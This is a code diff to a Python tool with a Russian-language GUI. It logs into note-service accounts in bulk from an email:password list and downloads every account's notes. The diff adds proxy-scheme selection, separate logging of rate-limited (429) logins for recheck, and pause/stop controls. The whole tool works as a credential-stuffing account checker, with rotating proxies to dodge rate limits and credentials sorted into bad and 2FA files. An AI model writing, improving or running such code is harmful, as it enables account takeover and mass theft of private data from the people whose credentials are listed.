@@ -24,6 +24,7 @@ try:
         QSpinBox,
         QLineEdit,
         QCheckBox,
+        QComboBox,
 
     )
     from PySide6.QtCore import QThread, Signal, QTimer
@@ -257,8 +258,16 @@ def fetch_pool(url: str) -> str:
         raise Exception(f"Unexpected error fetching pool: {str(e)}")
 
 class ProxyRotator:
-    def __init__(self, proxies: List[str], ttl_minutes: int, fetch_url: Optional[str] = None, enabled: bool = True):
-        self.proxies = [normalize_proxy(p) for p in (proxies or [])]
+    def __init__(
+        self,
+        proxies: List[str],
+        ttl_minutes: int,
+        fetch_url: Optional[str] = None,
+        enabled: bool = True,
+        default_scheme: str = DEFAULT_PROXY_SCHEME,
+    ):
+        self.default_scheme = default_scheme
+        self.proxies = [normalize_proxy(p, self.default_scheme) for p in (proxies or [])]
         self.fetch_url = fetch_url
         self.ttl_ms = ttl_minutes * 60_000
         self._cur: Optional[str] = None
@@ -275,7 +284,7 @@ class ProxyRotator:
         if self.fetch_url and (not self._cur or now >= self._until):
             try:
                 text = fetch_pool(self.fetch_url)
-                lines = load_proxies_from_text(text)
+                lines = load_proxies_from_text(text, self.default_scheme)
                 self.proxies = lines
                 self._cur = None
                 self._until = now + self.ttl_ms
@@ -292,7 +301,7 @@ class ProxyRotator:
         self._until = 0
 
     def set_list(self, proxies: List[str]):
-        self.proxies = [normalize_proxy(p) for p in proxies]
+        self.proxies = [normalize_proxy(p, self.default_scheme) for p in proxies]
         self._cur = None
         self._until = 0
 
@@ -317,22 +326,38 @@ def read_accounts(path: Path) -> List[Tuple[str,str]]:
 
 # core batch
 
-async def export_one_account(email: str, password: str, out_root: Path, rot: ProxyRotator, retries_account: int, note_conc: int, download_timeout: float, log: Callable[[str], None]|None, extended_log: bool = False) -> Tuple[str,bool,int,str]:
+async def export_one_account(
+    email: str,
+    password: str,
+    out_root: Path,
+    rot: ProxyRotator,
+    retries_account: int,
+    note_conc: int,
+    download_timeout: float,
+    log: Callable[[str], None] | None,
+    extended_log: bool = False,
+    stop_event: Optional[asyncio.Event] = None,
+) -> Tuple[str, bool, int, str]:
+    stop_event = stop_event or asyncio.Event()
     attempts = 0
-    last_err = ''
-    while attempts < retries_account:
+    last_err = ""
+    while attempts < retries_account and not stop_event.is_set():
         attempts += 1
         try:
             proxy = await rot.current()
-            if log: log(f"{email}: try {attempts}/{retries_account} proxy={proxy or 'none'}")
+            if log:
+                log(f"{email}: try {attempts}/{retries_account} proxy={proxy or 'none'}")
         except Exception as e:
             last_err = f"Proxy fetch error: {str(e)}"
-            if log: log(f"{email}: {last_err}")
+            if log:
+                log(f"{email}: {last_err}")
             await asyncio.sleep(1)
             continue
         client = NimbusClient(proxy_url=proxy)
         try:
-            user, resp_data, resp = client.login(email, password, return_raw=True)
+            user, resp_data, resp = await asyncio.to_thread(
+                client.login, email, password, return_raw=True
+            )
             if log: log(f"{email}: Logged in successfully")
             if extended_log and log:
                 log(f"{email}: login status: {resp.status_code}")
@@ -342,17 +367,19 @@ async def export_one_account(email: str, password: str, out_root: Path, rot: Pro
             # Например:
             # if resp_data.get('status') == 'bad':
             #     return email, False, 0, 'BAD'
-            workspaces: List[Dict[str,Any]] = []
-            for org in client.get_organizations():
-                workspaces.extend(client.get_workspaces(org['globalId']))
-            notes: List[Dict[str,Any]] = []
+            workspaces: List[Dict[str, Any]] = []
+            for org in await asyncio.to_thread(client.get_organizations):
+                workspaces.extend(
+                    await asyncio.to_thread(client.get_workspaces, org["globalId"])
+                )
+            notes: List[Dict[str, Any]] = []
             for w in workspaces:
-                notes.extend(client.list_notes(w))
+                notes.extend(await asyncio.to_thread(client.list_notes, w))
             for n in notes:
                 try:
-                    n['tags'] = client.get_note_tags(n)
+                    n["tags"] = await asyncio.to_thread(client.get_note_tags, n)
                 except Exception:
-                    n['tags'] = []
+                    n["tags"] = []
             if not notes:
                 client.close()
                 if log: log(f"{email}: No notes found, considering success")
@@ -376,30 +403,41 @@ async def export_one_account(email: str, password: str, out_root: Path, rot: Pro
             dl = httpx.Client(**dl_kwargs)
             try:
                 for ev in watcher.messages:
-                    msg = ev.get('message', {})
-                    url = msg.get('fileUrl')
-                    name = msg.get('fileName') or f"{msg.get('uuid','export')}.zip"
-                    if not url: continue
+                    msg = ev.get("message", {})
+                    url = msg.get("fileUrl")
+                    name = msg.get("fileName") or f"{msg.get('uuid','export')}.zip"
+                    if not url:
+                        continue
                     p = out_dir / name
-                    with dl.stream('GET', url) as r:
-                        r.raise_for_status()
-                        with open(p, 'wb') as f:
-                            for chunk in r.iter_bytes(): f.write(chunk)
+                    def _download():
+                        with dl.stream("GET", url) as r:
+                            r.raise_for_status()
+                            with open(p, "wb") as f:
+                                for chunk in r.iter_bytes():
+                                    f.write(chunk)
+                    await asyncio.to_thread(_download)
                     downloaded += 1
-                    if log: log(f"{email}: Downloaded {name}")
+                    if log:
+                        log(f"{email}: Downloaded {name}")
             finally:
-                dl.close(); client.close()
+                dl.close()
+                client.close()
             if log: log(f"{email}: Success, downloaded {downloaded} files")
             return email, True, downloaded, ''
         except BadCredentials as e:
             client.close()
             last_err = str(e)
-            if log: log(f"{email}: Bad credentials - {last_err}")
+            if e.response is not None and e.response.status_code == 429:
+                if log:
+                    log(f"{email}: {last_err}")
+                return email, False, 0, "429"
+            if log:
+                log(f"{email}: Bad credentials - {last_err}")
             if extended_log and log and getattr(e, "response", None):
                 log(f"{email}: response status: {e.response.status_code}")
                 log(f"{email}: response headers: {dict(e.response.headers)}")
                 log(f"{email}: response body: {e.response.text}")
-            return email, False, 0, 'BAD'
+            return email, False, 0, "BAD"
         except TwoFARequired as e:
             client.close()
             last_err = str(e)
@@ -428,36 +466,84 @@ async def export_one_account(email: str, password: str, out_root: Path, rot: Pro
     if log: log(f"{email}: Failed after retries - {last_err}")
     return email, False, 0, last_err or 'unknown'
 
-async def run_batch(accounts_file: Path, out_root: Path, rot: ProxyRotator, acc_conc: int, retries_account: int, note_conc: int, download_timeout: float, log_fn: Callable[[str], None]|None, stats_cb: Callable[[int,int,int,int], None]|None, extended_log: bool = False):
+async def run_batch(
+    accounts_file: Path,
+    out_root: Path,
+    rot: ProxyRotator,
+    acc_conc: int,
+    retries_account: int,
+    note_conc: int,
+    download_timeout: float,
+    log_fn: Callable[[str], None] | None,
+    stats_cb: Callable[[int, int, int, int], None] | None,
+    extended_log: bool = False,
+    stop_event: Optional[asyncio.Event] = None,
+    pause_event: Optional[asyncio.Event] = None,
+) -> None:
     accounts = read_accounts(accounts_file)
+    stop_event = stop_event or asyncio.Event()
+    pause_event = pause_event or asyncio.Event()
+    if not pause_event.is_set():
+        pause_event.set()
+
     in_work = 0
     good = 0
     bad = 0
     error = 0
-    sem = asyncio.Semaphore(acc_conc)
-    results: List[Tuple[str,bool,int,str]] = []
-    async def worker(email, pwd):
+
+    q: asyncio.Queue[Tuple[str, str]] = asyncio.Queue()
+    for item in accounts:
+        q.put_nowait(item)
+
+    async def worker_loop():
         nonlocal in_work, good, bad, error
-        async with sem:
+        while not stop_event.is_set():
+            await pause_event.wait()
+            try:
+                email, pwd = q.get_nowait()
+            except asyncio.QueueEmpty:
+                break
             in_work += 1
-            if stats_cb: stats_cb(in_work, good, bad, error)
-            em, ok, cnt, err = await export_one_account(email, pwd, out_root, rot, retries_account, note_conc, download_timeout, log_fn, extended_log)
-            results.append((em, ok, cnt, err))
+            if stats_cb:
+                stats_cb(in_work, good, bad, error)
+            em, ok, cnt, err = await export_one_account(
+                email,
+                pwd,
+                out_root,
+                rot,
+                retries_account,
+                note_conc,
+                download_timeout,
+                log_fn,
+                extended_log,
+                stop_event,
+            )
             in_work -= 1
             if ok:
                 good += 1
             else:
-                if err == 'BAD':
+                if err == "BAD":
                     bad += 1
-                    append_line(out_root / 'BAD.txt', f"{em}:{pwd}")
-                elif err == '2FA':
+                    append_line(out_root / "BAD.txt", f"{em}:{pwd}")
+                elif err == "2FA":
                     error += 1
-                    append_line(out_root / '2fa.txt', f"{em}:{pwd}")
+                    append_line(out_root / "2fa.txt", f"{em}:{pwd}")
+                elif err == "429":
+                    error += 1
+                    append_line(out_root / "429 Error ReCheck.txt", f"{em}:{pwd}")
                 else:
                     error += 1
-                    append_line(out_root / 'ERROR.txt', f"{em}:{pwd} - {err}")
-            if stats_cb: stats_cb(in_work, good, bad, error)
-    await asyncio.gather(*(worker(e,p) for e,p in accounts))
+                    append_line(out_root / "ERROR.txt", f"{em}:{pwd} - {err}")
+            if stats_cb:
+                stats_cb(in_work, good, bad, error)
+            q.task_done()
+
+    workers = [asyncio.create_task(worker_loop()) for _ in range(acc_conc)]
+    await q.join()
+    stop_event.set()
+    for w in workers:
+        w.cancel()
+    await asyncio.gather(*workers, return_exceptions=True)
 
 if GUI_AVAILABLE:
     class Worker(QThread):
@@ -479,6 +565,7 @@ if GUI_AVAILABLE:
             download_timeout: float,
             no_proxy: bool = False,
             extended_log: bool = False,
+            proxy_scheme: str = DEFAULT_PROXY_SCHEME,
         ):
             super().__init__()
             self.accounts_file = accounts_file
@@ -492,15 +579,21 @@ if GUI_AVAILABLE:
             self.download_timeout = download_timeout
             self.no_proxy = no_proxy
             self.extended_log = extended_log
+            self.proxy_scheme = proxy_scheme
             self.rot = ProxyRotator(
                 read_lines(proxies_file) if proxies_file else [],
                 proxy_ttl_min,
                 proxy_url,
                 not no_proxy,
+                proxy_scheme,
             )
         def set_proxy_url(self, url: Optional[str]):
             self.proxy_url = url
             self.rot.fetch_url = url
+
+        def set_proxy_scheme(self, scheme: str):
+            self.proxy_scheme = scheme
+            self.rot.default_scheme = scheme
 
         def set_no_proxy(self, val: bool):
             self.no_proxy = val
@@ -513,12 +606,12 @@ if GUI_AVAILABLE:
                 return
 
             raw_file_list = read_lines(self.proxies_file) if self.proxies_file else []
-            lst = [normalize_proxy(x) for x in raw_file_list]
+            lst = [normalize_proxy(x, self.proxy_scheme) for x in raw_file_list]
             pool_loaded = 0
             if self.proxy_url:
                 try:
                     text = fetch_pool(self.proxy_url)
-                    lines = load_proxies_from_text(text)
+                    lines = load_proxies_from_text(text, self.proxy_scheme)
                     pool_loaded = len(lines)
                     lst.extend(lines)
                     self.logsig.emit(f"Proxy pool loaded successfully: {pool_loaded} proxies")
@@ -530,11 +623,17 @@ if GUI_AVAILABLE:
             self.proxysig.emit(total)
 
         def run(self):
-            if sys.platform.startswith('win'):
+            if sys.platform.startswith("win"):
                 try:
                     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
                 except Exception:
                     pass
+
+            self.loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(self.loop)
+            self.stop_event = asyncio.Event()
+            self.pause_event = asyncio.Event()
+            self.pause_event.set()
 
             async def _run():
                 def log_cb(msg: str):
@@ -545,13 +644,37 @@ if GUI_AVAILABLE:
 
                 self.proxysig.emit(self.rot.count())
                 try:
-                    await run_batch(self.accounts_file, self.out_root, self.rot, self.acc_conc, self.retries_account, self.note_conc, self.download_timeout, log_cb, stats_cb, self.extended_log)
+                    await run_batch(
+                        self.accounts_file,
+                        self.out_root,
+                        self.rot,
+                        self.acc_conc,
+                        self.retries_account,
+                        self.note_conc,
+                        self.download_timeout,
+                        log_cb,
+                        stats_cb,
+                        self.extended_log,
+                        self.stop_event,
+                        self.pause_event,
+                    )
 
                 except Exception as e:
                     self.logsig.emit(f"ERROR: {e}")
 
-            asyncio.run(_run())
+            self.loop.run_until_complete(_run())
             self.finsig.emit()
+
+        def request_stop(self):
+            if getattr(self, "loop", None) and getattr(self, "stop_event", None):
+                self.loop.call_soon_threadsafe(self.stop_event.set)
+
+        def request_pause(self, pause: bool):
+            if getattr(self, "loop", None) and getattr(self, "pause_event", None):
+                if pause:
+                    self.loop.call_soon_threadsafe(self.pause_event.clear)
+                else:
+                    self.loop.call_soon_threadsafe(self.pause_event.set)
 
     class App(QWidget):
         def __init__(self):
@@ -568,6 +691,9 @@ if GUI_AVAILABLE:
             row = QHBoxLayout(); row.addWidget(self.btnProx); row.addWidget(self.lblProx); lay.addLayout(row)
             self.poolEdit = QLineEdit(); self.poolEdit.setPlaceholderText("Proxy pool URL (optional)")
             lay.addWidget(self.poolEdit)
+            self.schemeBox = QComboBox();
+            self.schemeBox.addItems(["Socks5", "Socks4", "HTTP"])
+            lay.addWidget(self.schemeBox)
             self.noProxyChk = QCheckBox("Без прокси")
             lay.addWidget(self.noProxyChk)
             self.verboseChk = QCheckBox("Расширенный лог")
@@ -598,6 +724,14 @@ if GUI_AVAILABLE:
             self.btnStart = QPushButton("Старт")
             self.btnStart.clicked.connect(self.start)
             lay.addWidget(self.btnStart)
+            self.btnPause = QPushButton("Пауза")
+            self.btnPause.setEnabled(False)
+            self.btnPause.clicked.connect(self.togglePause)
+            lay.addWidget(self.btnPause)
+            self.btnStop = QPushButton("Стоп")
+            self.btnStop.setEnabled(False)
+            self.btnStop.clicked.connect(self.stop)
+            lay.addWidget(self.btnStop)
             self.accounts: Optional[Path] = None
             self.proxies: Optional[Path] = None
             self.worker: Optional[Worker] = None
@@ -637,6 +771,7 @@ if GUI_AVAILABLE:
                 download_timeout=180.0,
                 no_proxy=self.noProxyChk.isChecked(),
                 extended_log=self.verboseChk.isChecked(),
+                proxy_scheme=self.schemeBox.currentText().lower(),
 
             )
             self.worker.logsig.connect(self.onLog)
@@ -647,12 +782,15 @@ if GUI_AVAILABLE:
             if not self.noProxyChk.isChecked():
                 self.refreshTimer.start(self.spinTTL.value() * 60_000)
             self.btnStart.setEnabled(False)
+            self.btnPause.setEnabled(True)
+            self.btnStop.setEnabled(True)
             self.log.append("Старт...")
 
         def onRefreshProxies(self):
             if self.worker:
                 self.worker.set_no_proxy(self.noProxyChk.isChecked())
                 self.worker.set_proxy_url(self.poolEdit.text().strip() or None)
+                self.worker.set_proxy_scheme(self.schemeBox.currentText().lower())
                 self.worker.reload_proxies()
             else:
                 if self.noProxyChk.isChecked():
@@ -660,13 +798,13 @@ if GUI_AVAILABLE:
                     self.log.append("Proxy preview: disabled")
                 else:
                     raw_file_list = read_lines(self.proxies) if self.proxies else []
-                    lst = [normalize_proxy(x) for x in raw_file_list]
+                    lst = [normalize_proxy(x, self.schemeBox.currentText().lower()) for x in raw_file_list]
                     pool = self.poolEdit.text().strip()
                     pool_loaded = 0
                     if pool:
                         try:
                             text = fetch_pool(pool)
-                            lines = load_proxies_from_text(text)
+                            lines = load_proxies_from_text(text, self.schemeBox.currentText().lower())
                             pool_loaded = len(lines)
                             lst.extend(lines)
                             self.log.append(f"Proxy pool loaded successfully: {pool_loaded} proxies")
@@ -688,6 +826,24 @@ if GUI_AVAILABLE:
             self.log.append("Готово")
             self.refreshTimer.stop()
             self.btnStart.setEnabled(True)
+            self.btnPause.setEnabled(False)
+            self.btnStop.setEnabled(False)
+
+        def togglePause(self):
+            if not self.worker:
+                return
+            if self.btnPause.text() == "Пауза":
+                self.worker.request_pause(True)
+                self.btnPause.setText("Возобновить")
+            else:
+                self.worker.request_pause(False)
+                self.btnPause.setText("Пауза")
+
+        def stop(self):
+            if self.worker:
+                self.worker.request_stop()
+                self.btnPause.setEnabled(False)
+                self.btnStop.setEnabled(False)
 
 def main_cli() -> None:
     import argparse
@@ -703,6 +859,7 @@ def main_cli() -> None:
     parser.add_argument("--timeout", type=float, default=180.0, help="Download timeout")
     parser.add_argument("--no-proxy", action="store_true", help="Disable proxy usage")
     parser.add_argument("--extended-log", action="store_true", help="Show server responses")
+    parser.add_argument("--proxy-scheme", choices=["socks5", "socks4", "http"], default="socks5", help="Proxy scheme for raw proxies")
 
 
     args = parser.parse_args()
@@ -712,6 +869,7 @@ def main_cli() -> None:
         args.proxy_ttl,
         args.proxy_url,
         not args.no_proxy,
+        args.proxy_scheme,
     )
 
     async def _run():
